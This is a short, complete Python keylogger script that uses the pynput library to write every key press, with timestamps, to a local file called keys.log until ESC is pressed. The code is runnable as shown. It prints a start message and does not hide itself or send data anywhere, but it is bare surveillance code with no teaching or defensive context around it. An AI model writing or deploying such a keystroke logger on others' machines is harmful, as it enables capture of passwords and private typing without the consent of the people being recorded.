import logging
from datetime import datetime
from pynput import keyboard

LOG_FILE = "keys.log"

logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)


def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")



def on_release(key):
    if key == keyboard.Key.esc:
        return False


if __name__ == "__main__":
    print(f"Keylogger started. Logs will be saved to {LOG_FILE}")
    print("Press ESC to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
